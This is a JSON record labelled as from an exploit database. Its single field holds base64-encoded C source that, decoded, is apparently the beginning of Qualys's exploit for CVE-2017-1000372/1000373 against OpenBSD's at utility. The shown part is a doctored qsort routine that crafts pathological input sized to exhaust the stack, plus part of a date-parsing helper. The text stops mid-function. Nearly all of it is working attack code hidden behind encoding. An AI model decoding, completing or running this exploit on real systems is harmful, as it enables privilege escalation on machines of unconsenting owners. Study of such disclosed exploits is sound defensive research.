{
    "source": "exploit-database", 
    "exploit": "LyoNCiAqIE9wZW5CU0RfYXQuYyBmb3IgQ1ZFLTIwMTctMTAwMDM3Mw0KICogQ29weXJpZ2h0IChjKSAyMDE3ICBRdWFseXMsIEluYy4NCiAqIHNsb3dzb3J0KCkgYWRhcHRlZCBmcm9tIGxpYi9saWJjL3N0ZGxpYi9xc29ydC5jOg0KICoNCiAqIENvcHlyaWdodCAoYykgMTk5MiwgMTk5Mw0KICogICAgICBUaGUgUmVnZW50cyBvZiB0aGUgVW5pdmVyc2l0eSBvZiBDYWxpZm9ybmlhLiAgQWxsIHJpZ2h0cyByZXNlcnZlZC4NCiAqDQogKiBSZWRpc3RyaWJ1dGlvbiBhbmQgdXNlIGluIHNvdXJjZSBhbmQgYmluYXJ5IGZvcm1zLCB3aXRoIG9yIHdpdGhvdXQNCiAqIG1vZGlmaWNhdGlvbiwgYXJlIHBlcm1pdHRlZCBwcm92aWRlZCB0aGF0IHRoZSBmb2xsb3dpbmcgY29uZGl0aW9ucw0KICogYXJlIG1ldDoNCiAqIDEuIFJlZGlzdHJpYnV0aW9ucyBvZiBzb3VyY2UgY29kZSBtdXN0IHJldGFpbiB0aGUgYWJvdmUgY29weXJpZ2h0DQogKiAgICBub3RpY2UsIHRoaXMgbGlzdCBvZiBjb25kaXRpb25zIGFuZCB0aGUgZm9sbG93aW5nIGRpc2NsYWltZXIuDQogKiAyLiBSZWRpc3RyaWJ1dGlvbnMgaW4gYmluYXJ5IGZvcm0gbXVzdCByZXByb2R1Y2UgdGhlIGFib3ZlIGNvcHlyaWdodA0KICogICAgbm90aWNlLCB0aGlzIGxpc3Qgb2YgY29uZGl0aW9ucyBhbmQgdGhlIGZvbGxvd2luZyBkaXNjbGFpbWVyIGluIHRoZQ0KICogICAgZG9jdW1lbnRhdGlvbiBhbmQvb3Igb3RoZXIgbWF0ZXJpYWxzIHByb3ZpZGVkIHdpdGggdGhlIGRpc3RyaWJ1dGlvbi4NCiAqIDMuIE5laXRoZXIgdGhlIG5hbWUgb2YgdGhlIFVuaXZlcnNpdHkgbm9yIHRoZSBuYW1lcyBvZiBpdHMgY29udHJpYnV0b3JzDQogKiAgICBtYXkgYmUgdXNlZCB0byBlbmRvcnNlIG9yIHByb21vdGUgcHJvZHVjdHMgZGVyaXZlZCBmcm9tIHRoaXMgc29mdHdhcmUNCiAqICAgIHdpdGhvdXQgc3BlY2lmaWMgcHJpb3Igd3JpdHRlbiBwZXJtaXNzaW9uLg0KICoNCiAqIFRISVMgU09GVFdBUkUgSVMgUFJPVklERUQgQlkgVEhFIFJFR0VOVFMgQU5EIENPTlRSSUJVVE9SUyBgYEFTIElTJycgQU5EDQogKiBBTlkgRVhQUkVTUyBPUiBJTVBMSUVEIFdBUlJBTlRJRVMsIElOQ0xVRElORywgQlVUIE5PVCBMSU1JVEVEIFRPLCBUSEUNCiAqIElNUExJRUQgV0FSUkFOVElFUyBPRiBNRVJDSEFOVEFCSUxJVFkgQU5EIEZJVE5FU1MgRk9SIEEgUEFSVElDVUxBUiBQVVJQT1NFDQogKiBBUkUgRElTQ0xBSU1FRC4gIElOIE5PIEVWRU5UIFNIQUxMIFRIRSBSRUdFTlRTIE9SIENPTlRSSUJVVE9SUyBCRSBMSUFCTEUNCiAqIEZPUiBBTlkgRElSRUNULCBJTkRJUkVDVCwgSU5DSURFTlRBTCwgU1BFQ0lBTCwgRVhFTVBMQVJZLCBPUiBDT05TRVFVRU5USUFMDQogKiBEQU1BR0VTIChJTkNMVURJTkcsIEJVVCBOT1QgTElNSVRFRCBUTywgUFJPQ1VSRU1FTlQgT0YgU1VCU1RJVFVURSBHT09EUw0KICogT1IgU0VSVklDRVM7IExPU1MgT0YgVVNFLCBEQVRBLCBPUiBQUk9GSVRTOyBPUiBCVVNJTkVTUyBJTlRFUlJVUFRJT04pDQogKiBIT1dFVkVSIENBVVNFRCBBTkQgT04gQU5ZIFRIRU9SWSBPRiBMSUFCSUxJVFksIFdIRVRIRVIgSU4gQ09OVFJBQ1QsIFNUUklDVA0KICogTElBQklMSVRZLCBPUiBUT1JUIChJTkNMVURJTkcgTkVHTElHRU5DRSBPUiBPVEhFUldJU0UpIEFSSVNJTkcgSU4gQU5ZIFdBWQ0KICogT1VUIE9GIFRIRSBVU0UgT0YgVEhJUyBTT0ZUV0FSRSwgRVZFTiBJRiBBRFZJU0VEIE9GIFRIRSBQT1NTSUJJTElUWSBPRg0KICogU1VDSCBEQU1BR0UuDQogKi8NCg0KLyoNCiAqICBPcGVuQlNEX2F0LmMgZm9yIENWRS0yMDE3LTEwMDAzNzINCiAqICBDb3B5cmlnaHQgKEMpIDIwMTcgIFF1YWx5cywgSW5jLg0KICogIHR0aW1lKCkgYWRhcHRlZCBmcm9tIHVzci5iaW4vYXQvYXQuYzoNCiAqDQogKiAgYXQuYyA6IFB1dCBmaWxlIGludG8gYXRydW4gcXVldWUNCiAqICBDb3B5cmlnaHQgKEMpIDE5OTMsIDE5OTQgIFRob21hcyBLb2VuaWcNCiAqDQogKiAgQXRydW4gJiBBdHEgbW9kaWZpY2F0aW9ucw0KICogIENvcHlyaWdodCAoQykgMTk5MyAgRGF2aWQgUGFyc29ucw0KICoNCiAqICBUcmFkaXRpb25hbCBCU0QgYmVoYXZpb3IgYW5kIG90aGVyIHNpZ25pZmljYW50IG1vZGlmaWNhdGlvbnMNCiAqICBDb3B5cmlnaHQgKEMpIDIwMDItMjAwMyAgVG9kZCBDLiBNaWxsZXINCiAqDQogKiBSZWRpc3RyaWJ1dGlvbiBhbmQgdXNlIGluIHNvdXJjZSBhbmQgYmluYXJ5IGZvcm1zLCB3aXRoIG9yIHdpdGhvdXQNCiAqIG1vZGlmaWNhdGlvbiwgYXJlIHBlcm1pdHRlZCBwcm92aWRlZCB0aGF0IHRoZSBmb2xsb3dpbmcgY29uZGl0aW9ucw0KICogYXJlIG1ldDoNCiAqIDEuIFJlZGlzdHJpYnV0aW9ucyBvZiBzb3VyY2UgY29kZSBtdXN0IHJldGFpbiB0aGUgYWJvdmUgY29weXJpZ2h0DQogKiAgICBub3RpY2UsIHRoaXMgbGlzdCBvZiBjb25kaXRpb25zIGFuZCB0aGUgZm9sbG93aW5nIGRpc2NsYWltZXIuDQogKiAyLiBUaGUgbmFtZSBvZiB0aGUgYXV0aG9yKHMpIG1heSBub3QgYmUgdXNlZCB0byBlbmRvcnNlIG9yIHByb21vdGUNCiAqICAgIHByb2R1Y3RzIGRlcml2ZWQgZnJvbSB0aGlzIHNvZnR3YXJlIHdpdGhvdXQgc3BlY2lmaWMgcHJpb3Igd3JpdHRlbg0KICogICAgcGVybWlzc2lvbi4NCiAqDQogKiBUSElTIFNPRlRXQVJFIElTIFBST1ZJREVEIEJZIFRIRSBBVVRIT1IoUykgYGBBUyBJUycnIEFORCBBTlkgRVhQUkVTUyBPUg0KICogSU1QTElFRCBXQVJSQU5USUVTLCBJTkNMVURJTkcsIEJVVCBOT1QgTElNSVRFRCBUTywgVEhFIElNUExJRUQgV0FSUkFOVElFUw0KICogT0YgTUVSQ0hBTlRBQklMSVRZIEFORCBGSVRORVNTIEZPUiBBIFBBUlRJQ1VMQVIgUFVSUE9TRSBBUkUgRElTQ0xBSU1FRC4NCiAqIElOIE5PIEVWRU5UIFNIQUxMIFRIRSBBVVRIT1IoUykgQkUgTElBQkxFIEZPUiBBTlkgRElSRUNULCBJTkRJUkVDVCwNCiAqIElOQ0lERU5UQUwsIFNQRUNJQUwsIEVYRU1QTEFSWSwgT1IgQ09OU0VRVUVOVElBTCBEQU1BR0VTIChJTkNMVURJTkcsIEJVVA0KICogTk9UIExJTUlURUQgVE8sIFBST0NVUkVNRU5UIE9GIFNVQlNUSVRVVEUgR09PRFMgT1IgU0VSVklDRVM7IExPU1MgT0YgVVNFLA0KICogREFUQSwgT1IgUFJPRklUUzsgT1IgQlVTSU5FU1MgSU5URVJSVVBUSU9OKSBIT1dFVkVSIENBVVNFRCBBTkQgT04gQU5ZDQogKiBUSEVPUlkgT0YgTElBQklMSVRZLCBXSEVUSEVSIElOIENPTlRSQUNULCBTVFJJQ1QgTElBQklMSVRZLCBPUiBUT1JUDQogKiAoSU5DTFVESU5HIE5FR0xJR0VOQ0UgT1IgT1RIRVJXSVNFKSBBUklTSU5HIElOIEFOWSBXQVkgT1VUIE9GIFRIRSBVU0UgT0YNCiAqIFRISVMgU09GVFdBUkUsIEVWRU4gSUYgQURWSVNFRCBPRiBUSEUgUE9TU0lCSUxJVFkgT0YgU1VDSCBEQU1BR0UuDQogKi8NCg0KI2luY2x1ZGUgPGN0eXBlLmg+DQojaW5jbHVkZSA8ZGlyZW50Lmg+DQojaW5jbHVkZSA8ZGxmY24uaD4NCiNpbmNsdWRlIDxmY250bC5oPg0KI2luY2x1ZGUgPHN0ZGJvb2wuaD4NCiNpbmNsdWRlIDxzdGRpbnQuaD4NCiNpbmNsdWRlIDxzdGRsaWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDxzeXMvcGFyYW0uaD4NCiNpbmNsdWRlIDxzeXMvc3RhdC5oPg0KI2luY2x1ZGUgPHN5cy90eXBlcy5oPg0KI2luY2x1ZGUgPHRpbWUuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCg0Kc3RhdGljIGNvbnN0IGNoYXIgKg0KdTY0dG9zdHIodWludDY0X3QgdTY0KQ0Kew0KICAgIHN0YXRpYyBjaGFyIHN0cls2NF07DQogICAgY2hhciAqIGNwID0gc3RyICsgc2l6ZW9mKHN0cik7DQogICAgKi0tY3AgPSAnXDAnOw0KICAgIGRvIHsNCiAgICAgICAgaWYgKGNwIDw9IHN0cikgX2V4aXQoX19MSU5FX18pOw0KICAgICAgICAqLS1jcCA9ICcwJyArICh1NjQgJSAxMCk7DQogICAgfSB3aGlsZSAodTY0IC89IDEwKTsNCiAgICByZXR1cm4gY3A7DQp9DQoNCiNkZWZpbmUgZGllKCkgZG8geyBcDQogICAgY29uc3QgY2hhciAqIGNvbnN0IHN0ciA9IHU2NHRvc3RyKF9fTElORV9fKTsgXA0KICAgIGNvbnN0IHNpemVfdCBsZW4gPSBzdHJsZW4oc3RyKTsgXA0KICAgIHdyaXRlKFNUREVSUl9GSUxFTk8sICJcblsiLCAyKTsgXA0KICAgIHdyaXRlKFNUREVSUl9GSUxFTk8sIHN0ciwgbGVuKTsgXA0KICAgIHdyaXRlKFNUREVSUl9GSUxFTk8sICJdXG4iLCAyKTsgXA0KICAgIF9leGl0KEVYSVRfRkFJTFVSRSk7IFwNCn0gd2hpbGUgKDApDQoNCnN0YXRpYyBfX2lubGluZSBjaGFyICAgICptZWQzKGNoYXIgKiwgY2hhciAqLCBjaGFyICosIGludCAoKikoY29uc3Qgdm9pZCAqLCBjb25zdCB2b2lkICopKTsNCnN0YXRpYyBfX2lubGluZSB2b2lkICAgICBzd2FwZnVuYyhjaGFyICosIGNoYXIgKiwgc2l6ZV90LCBpbnQpOw0KDQovKg0KICogUXNvcnQgcm91dGluZSBmcm9tIEJlbnRsZXkgJiBNY0lscm95J3MgIkVuZ2luZWVyaW5nIGEgU29ydCBGdW5jdGlvbiIuDQogKi8NCiNkZWZpbmUgc3dhcGNvZGUoVFlQRSwgcGFybWksIHBhcm1qLCBuKSB7ICAgICAgICAgICAgICAgXA0KICAgICAgICBzaXplX3QgaSA9IChuKSAvIHNpemVvZiAoVFlQRSk7ICAgICAgICAgICAgICAgICBcDQogICAgICAgIFRZUEUgKnBpID0gKFRZUEUgKikgKHBhcm1pKTsgICAgICAgICAgICAgICAgICAgIFwNCiAgICAgICAgVFlQRSAqcGogPSAoVFlQRSAqKSAocGFybWopOyAgICAgICAgICAgICAgICAgICAgXA0KICAgICAgICBkbyB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcDQogICAgICAgICAgICAgICAgVFlQRSAgICB0ID0gKnBpOyAgICAgICAgICAgICAgICAgICAgICAgIFwNCiAgICAgICAgICAgICAgICAqcGkrKyA9ICpwajsgICAgICAgICAgICAgICAgICAgICAgICAgICAgXA0KICAgICAgICAgICAgICAgICpwaisrID0gdDsgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcDQogICAgICAgIH0gd2hpbGUgKC0taSA+IDApOyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwNCn0NCg0KI2RlZmluZSBTV0FQSU5JVChhLCBlcykgc3dhcHR5cGUgPSAoKGNoYXIgKilhIC0gKGNoYXIgKikwKSAlIHNpemVvZihsb25nKSB8fCBcDQogICAgICAgIGVzICUgc2l6ZW9mKGxvbmcpID8gMiA6IGVzID09IHNpemVvZihsb25nKT8gMCA6IDE7DQoNCnN0YXRpYyBfX2lubGluZSB2b2lkDQpzd2FwZnVuYyhjaGFyICphLCBjaGFyICpiLCBzaXplX3QgbiwgaW50IHN3YXB0eXBlKQ0Kew0KICAgICAgICBpZiAoc3dhcHR5cGUgPD0gMSkNCiAgICAgICAgICAgICAgICBzd2FwY29kZShsb25nLCBhLCBiLCBuKQ0KICAgICAgICBlbHNlDQogICAgICAgICAgICAgICAgc3dhcGNvZGUoY2hhciwgYSwgYiwgbikNCn0NCg0KI2RlZmluZSBzd2FwKGEsIGIpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcDQogICAgICAgIGlmIChzd2FwdHlwZSA9PSAwKSB7ICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwNCiAgICAgICAgICAgICAgICBsb25nIHQgPSAqKGxvbmcgKikoYSk7ICAgICAgICAgICAgICAgICAgXA0KICAgICAgICAgICAgICAgICoobG9uZyAqKShhKSA9ICoobG9uZyAqKShiKTsgICAgICAgICAgICBcDQogICAgICAgICAgICAgICAgKihsb25nICopKGIpID0gdDsgICAgICAgICAgICAgICAgICAgICAgIFwNCiAgICAgICAgfSBlbHNlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgXA0KICAgICAgICAgICAgICAgIHN3YXBmdW5jKGEsIGIsIGVzLCBzd2FwdHlwZSkNCg0KI2RlZmluZSB2ZWNzd2FwKGEsIGIsIG4pICAgICAgICBpZiAoKG4pID4gMCkgc3dhcGZ1bmMoYSwgYiwgbiwgc3dhcHR5cGUpDQoNCnN0YXRpYyBfX2lubGluZSBjaGFyICoNCm1lZDMoY2hhciAqYSwgY2hhciAqYiwgY2hhciAqYywgaW50ICgqY21wKShjb25zdCB2b2lkICosIGNvbnN0IHZvaWQgKikpDQp7DQogICAgICAgIHJldHVybiBjbXAoYSwgYikgPCAwID8NCiAgICAgICAgICAgICAgIChjbXAoYiwgYykgPCAwID8gYiA6IChjbXAoYSwgYykgPCAwID8gYyA6IGEgKSkNCiAgICAgICAgICAgICAgOihjbXAoYiwgYykgPiAwID8gYiA6IChjbXAoYSwgYykgPCAwID8gYSA6IGMgKSk7DQp9DQoNCnR5cGVkZWYgc3RydWN0IHsNCiAgICAgICAgc2l6ZV90IGlkeDsNCiAgICAgICAgc2l6ZV90IGtleTsNCn0gc2xvd3NvcnRfdDsNCg0Kc3RhdGljIF9faW5saW5lIHZvaWQNCnNldF9rZXkodm9pZCAqIGNvbnN0IF9wc3MsIGNvbnN0IHNpemVfdCBrZXkpDQp7DQogICAgICAgIHNsb3dzb3J0X3QgKiBjb25zdCBwc3MgPSBfcHNzOw0KICAgICAgICBpZiAoIXBzcykgZGllKCk7DQogICAgICAgIGlmICgha2V5KSBkaWUoKTsNCiAgICAgICAgaWYgKHBzcy0+a2V5KSBkaWUoKTsNCiAgICAgICAgcHNzLT5rZXkgPSBrZXk7DQp9DQoNCiNkZWZpbmUgUkVTRVRfS0VZIFNJWkVfTUFYDQoNCnN0YXRpYyB2b2lkDQpzbG93c29ydCh2b2lkICphYSwgc2l6ZV90IG4sIHNpemVfdCBlcywgaW50ICgqY21wKShjb25zdCB2b2lkICosIGNvbnN0IHZvaWQgKiksIGNvbnN0IHNpemVfdCBzdGFja19zaXplKQ0Kew0KICAgICAgICBpZiAoIWFhKSBkaWUoKTsNCiAgICAgICAgaWYgKG4gPD0gMCkgZGllKCk7DQogICAgICAgIGlmIChuID49IFNTSVpFX01BWCkgZGllKCk7DQogICAgICAgIGlmIChlcyA8PSAwKSBkaWUoKTsNCiAgICAgICAgaWYgKGVzID49IFNTSVpFX01BWCkgZGllKCk7DQogICAgICAgIGlmICghY21wKSBkaWUoKTsNCg0KICAgICAgICAjZGVmaW5lIFNFVF9LRVlTIDQNCiAgICAgICAgI2RlZmluZSBTVEFDS19GUkFNRV9TSVpFIDE3Ng0KICAgICAgICBjb25zdCBzaXplX3QgcGF0aG9sb2dpY2FsID0gc3RhY2tfc2l6ZSAvIFNUQUNLX0ZSQU1FX1NJWkUgKiBTRVRfS0VZUzsNCiAgICAgICAgaWYgKG4gPCBwYXRob2xvZ2ljYWwpIGRpZSgpOw0KICAgICAgICBzaXplX3QgaW5ub2N1b3VzID0gbiAtIHBhdGhvbG9naWNhbDsNCg0KICAgICAgICBjaGFyICpwYSwgKnBiLCAqcGMsICpwZCwgKnBsLCAqcG0sICpwbjsNCiAgICAgICAgaW50IGNtcF9yZXN1bHQsIHN3YXB0eXBlOw0KICAgICAgICBzaXplX3QgZCwgcjsNCiAgICAgICAgY2hhciAqYSA9IGFhOw0KDQpsb29wOiAgIFNXQVBJTklUKGEsIGVzKTsNCiAgICAgICAgaWYgKGlubm9jdW91cykgew0KICAgICAgICAgICAgaWYgKG4gPD0gaW5ub2N1b3VzKSBkaWUoKTsNCiAgICAgICAgICAgIGlmIChuIC0gaW5ub2N1b3VzIDw9IFNFVF9LRVlTKSBkaWUoKTsNCiAgICAgICAgICAgIGlmIChuIDw9IDQwKSBkaWUoKTsNCiAgICAgICAgfQ0KICAgICAgICBpZiAobiA8IDcpIHsNCiAgICAgICAgICAgICAgICBmb3IgKHBtID0gYTsgcG0gPCBhICsgbiAqIGVzOyBwbSArPSBlcykgew0KICAgICAgICAgICAgICAgICAgICAgICAgc2V0X2tleShwbSwgMSArIChwbSAtIGEpIC8gZXMpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBmb3IgKHBtID0gKGNoYXIgKilhICsgZXM7IHBtIDwgKGNoYXIgKikgYSArIG4gKiBlczsgcG0gKz0gZXMpDQogICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHBsID0gcG07IHBsID4gKGNoYXIgKikgYSAmJiBjbXAocGwgLSBlcywgcGwpID4gMDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGwgLT0gZXMpDQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN3YXAocGwsIHBsIC0gZXMpOw0KICAgICAgICAgICAgICAgIHJldHVybjsNCiAgICAgICAgfQ0KICAgICAgICBwbSA9IChjaGFyICopYSArIChuIC8gMikgKiBlczsNCiAgICAgICAgc2l6ZV90IHNldF9rZXlzID0gMDsNCiAgICAgICAgaWYgKG4gPiA3KSB7DQogICAgICAgICAgICAgICAgcGwgPSAoY2hhciAqKWE7DQogICAgICAgICAgICAgICAgcG4gPSAoY2hhciAqKWEgKyAobiAtIDEpICogZXM7DQogICAgICAgICAgICAgICAgaWYgKG4gPiA0MCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgZCA9IChuIC8gOCkgKiBlczsNCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChpbm5vY3VvdXMpIHsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZXRfa2V5KHBsLCBSRVNFVF9LRVkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldF9rZXkocGwgKyBkLCBSRVNFVF9LRVkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHNldF9rZXkocGwgKyAyICogZCwgUkVTRVRfS0VZKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICAgICAgICAgIHBsID0gbWVkMyhwbCwgcGwgKyBkLCBwbCArIDIgKiBkLCBjbXApOw0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGlubm9jdW91cykgc2V0X2tleShwbSAtIGQsIFJFU0VUX0tFWSk7DQogICAgICAgICAgICAgICAgICAgICAgICBzZXRfa2V5KHBtICsgMCwgbiAtIGlubm9jdW91cyAtIDMpOw0KICAgICAgICAgICAgICAgICAgICAgICAgc2V0X2tleShwbSArIGQsIG4gLSBpbm5vY3VvdXMgLSAyKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBtID0gbWVkMyhwbSAtIGQsIHBtLCBwbSArIGQsIGNtcCk7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoaW5ub2N1b3VzKSBzZXRfa2V5KHBuIC0gMiAqIGQsIFJFU0VUX0tFWSk7DQogICAgICAgICAgICAgICAgICAgICAgICBzZXRfa2V5KHBuIC0gZCwgbiAtIGlubm9jdW91cyAtIDEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgc2V0X2tleShwbiAtIDAsIG4gLSBpbm5vY3VvdXMgLSAwKTsNCiAgICAgICAgICAgICAgICAgICAgICAgIHBuID0gbWVkMyhwbiAtIDIgKiBkLCBwbiAtIGQsIHBuLCBjbXApOw0KICAgICAgICAgICAgICAgICAgICAgICAgc2V0X2tleXMgPSBTRVRfS0VZUzsNCiAgICAgICAgICAgICAgICB9IGVsc2Ugew0KICAgICAgICAgICAgICAgICAgICAgICAgc2V0X2tleShwbSwgbiAtIDEpOw0KICAgICAgICAgICAgICAgICAgICAgICAgc2V0X2tleShwbiwgbiAtIDApOw0KICAgICAgICAgICAgICAgICAgICAgICAgc2V0X2tleXMgPSAyOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBwbSA9IG1lZDMocGwsIHBtLCBwbiwgY21wKTsNCiAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgICAgICBzZXRfa2V5KHBtLCBuIC0gMCk7DQogICAgICAgICAgICAgICAgc2V0X2tleXMgPSAxOw0KICAgICAgICB9DQogICAgICAgIGlmICghc2V0X2tleXMpIGRpZSgpOw0KICAgICAgICBzd2FwKGEsIHBtKTsNCiAgICAgICAgaWYgKGlubm9jdW91cykgew0KICAgICAgICAgICAgaWYgKGEgIT0gYWEpIGRpZSgpOw0KICAgICAgICAgICAgc2xvd3NvcnRfdCAqIHBzcyA9IGFhOw0KICAgICAgICAgIHsNCiAgICAgICAgICAgIGNvbnN0IHNpemVfdCBrZXkgPSBwc3MtPmtleTsNCiAgICAgICAgICAgIGlmICgha2V5KSBkaWUoKTsNCiAgICAgICAgICAgIGlmIChuIDw9IDQwKSBkaWUoKTsNCiAgICAgICAgICAgIGlmIChzZXRfa2V5cyAhPSBTRVRfS0VZUykgZGllKCk7DQogICAgICAgICAgICBpZiAoa2V5ICE9IG4gLSBpbm5vY3VvdXMgLSBzZXRfa2V5cyArIDEpIGRpZSgpOw0KICAgICAgICAgIH0NCiAgICAgICAgICAgIGNvbnN0IHNsb3dzb3J0X3QgKiBjb25zdCBlbmQgPSBwc3MgKyBuOw0KICAgICAgICAgICAgc2l6ZV90IGkgPSAwOw0KICAgICAgICAgICAgZm9yICg7OyBwc3MrKykgew0KICAgICAgICAgICAgICAgIGlmIChwc3MgPj0gZW5kKSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChpICE9IGlubm9jdW91cykgZGllKCk7DQogICAgICAgICAgICAgICAgICAgIGJyZWFrOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgICAgICBpZiAoIXBzcy0+a2V5KSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChpIDwgaW5ub2N1b3VzKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBzZXRfa2V5KHBzcywgbiAtIGkrKyk7DQogICAgICAgICAgICAgICAgICAgICAgICBzZXRfa2V5cysrOw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfSBlbHNlIGlmIChwc3MtPmtleSA9PSBSRVNFVF9LRVkpIHsNCiAgICAgICAgICAgICAgICAgICAgcHNzLT5rZXkgPSAwOw0KICAgICAgICAgICAgICAgIH0gZWxzZSB7DQogICAgICAgICAgICAgICAgICAgIGlmIChwc3MtPmtleSA+IG4gLSBpbm5vY3VvdXMpIGRpZSgpOw0KICAgICAgICAgICAgICAgIH0NCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAgICAgICBwYSA9IHBiID0gKGNoYXIgKilhICsgZXM7DQogICAgICAgIHBjID0gcGQgPSAoY2hhciAqKWEgKyAobiAtIDEpICogZXM7DQogICAgICAgIGZvciAoOzspIHsNCiAgICAgICAgICAgICAgICB3aGlsZSAocGIgPD0gcGMgJiYgKGNtcF9yZXN1bHQgPSBjbXAocGIsIGEpKSA8PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICBpZiAoY21wX3Jlc3VsdCA9PSAwKSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN3YXAocGEsIHBiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGEgKz0gZXM7DQogICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICBwYiArPSBlczsNCiAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgd2hpbGUgKHBiIDw9IHBjICYmIChjbXBfcmVzdWx0ID0gY21wKHBjLCBhKSkgPj0gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKGNtcF9yZXN1bHQgPT0gMCkgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBzd2FwKHBjLCBwZCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBkIC09IGVzOw0KICAgICAgICAgICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgICAgICAgICAgcGMgLT0gZXM7DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgICAgIGlmIChwYiA+IHBjKQ0KICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7DQogICAgICAgICAgICAgICAgc3dhcChwYiwgcGMpOw0KICAgICAgICAgICAgICAgIHBiICs9IGVzOw0KICAgICAgICAgICAgICAgIHBjIC09IGVzOw0KICAgICAgICB9DQoNCiAgICAgICAgcG4gPSAoY2hhciAqKWEgKyBuICogZXM7DQogICAgICAgIHIgPSBNSU4ocGEgLSAoY2hhciAqKWEsIHBiIC0gcGEpOw0KICAgICAgICB2ZWNzd2FwKGEsIHBiIC0gciwgcik7DQogICAgICAgIHIgPSBNSU4ocGQgLSBwYywgcG4gLSBwZCAtIChzc2l6ZV90KWVzKTsNCiAgICAgICAgdmVjc3dhcChwYiwgcG4gLSByLCByKTsNCg0KICAgICAgICBpZiAoKHBiIC0gcGEpIC8gZXMgIT0gbiAtIHNldF9rZXlzKSBkaWUoKTsNCiAgICAgICAgaWYgKChwZCAtIHBjKSAvIGVzICE9IHNldF9rZXlzIC0gMSkgZGllKCk7DQoNCiAgICAgICAgaWYgKChyID0gcGIgLSBwYSkgPiBlcykgew0KICAgICAgICAgICAgICAgIG4gPSByIC8gZXM7DQogICAgICAgICAgICAgICAgaW5ub2N1b3VzID0gMDsNCiAgICAgICAgICAgICAgICBnb3RvIGxvb3A7DQogICAgICAgIH0NCiAgICAgICAgZGllKCk7DQp9DQoNCnN0YXRpYyBpbnQNCmNtcF9rZXkoY29uc3Qgdm9pZCAqIGNvbnN0IGEsIGNvbnN0IHZvaWQgKiBjb25zdCBiKQ0Kew0KICAgICAgICBjb25zdCBzaXplX3QgX19hX2tleSA9ICgoY29uc3Qgc2xvd3NvcnRfdCAqKWEpLT5rZXk7DQogICAgICAgIGNvbnN0IHNpemVfdCBfX2Jfa2V5ID0gKChjb25zdCBzbG93c29ydF90ICopYiktPmtleTsNCiAgICAgICAgY29uc3Qgc2l6ZV90IGFfa2V5ID0gX19hX2tleSAhPSBSRVNFVF9LRVkgPyBfX2Ffa2V5IDogMDsNCiAgICAgICAgY29uc3Qgc2l6ZV90IGJfa2V5ID0gX19iX2tleSAhPSBSRVNFVF9LRVkgPyBfX2Jfa2V5IDogMDsNCiAgICAgICAgaWYgKGFfa2V5IDwgYl9rZXkpIHJldHVybiAtMTsNCiAgICAgICAgaWYgKGFfa2V5ID4gYl9rZXkpIHJldHVybiArMTsNCiAgICAgICAgcmV0dXJuIDA7DQp9DQoNCiNkZWZpbmUgICAgQVRPSTIocykgICAgKChzKSArPSAyLCAoKHMpWy0yXSAtICcwJykgKiAxMCArICgocylbLTFdIC0gJzAnKSkNCg0KLyoNCiAqIEFkYXB0ZWQgZnJvbSBkYXRlKDEpDQogKi8NCnN0YXRpYyB0aW1lX3QNCnR0aW1lKGNoYXIgKmFyZykNCnsNCiAgICB0aW1lX3Qgbm93LCB0aGVuOw0KICAgIHN0cnVjdCB0bSAqbHQ7DQogICAgaW50IHllYXJzZXQ7DQogICAgY2hhciAqZG90LCAqcDsNCg0KICAgIGlmICh0aW1lKCZub3cpID09ICh0aW1lX3QpLTEgfHwgKGx0ID0gbG9jYWx0aW1lKCZub3cpKSA9PSBOVUxMKQ0KICAgICAgICBkaWUoKTsNCg0KICAgIC8qIFZhbGlkIGRhdGUgZm9ybWF0IGlzIFtbQ0NdWVldTU1ERGhobW1bLlNTXSAqLw0KICAgIGZvciAocCA9IGFyZywgZG90ID0gTlVMTDsgKnAgIT0gJ1wwJzsgcCsrKSB7DQogICAgICAgIGlmICgqcCA9PSAnLicgJiYgZG90ID09IE5VTEwpDQogICAgICAgICAgICBkb3QgPSBwOw0KICAgICAgICBlbHNlIGlmICghaXNkaWdpdCgodW5zaWduZWQgY2hhcikqcCkpDQogICAgICAgICAgICBnb3RvIHRlcnI7DQogICAgfQ0K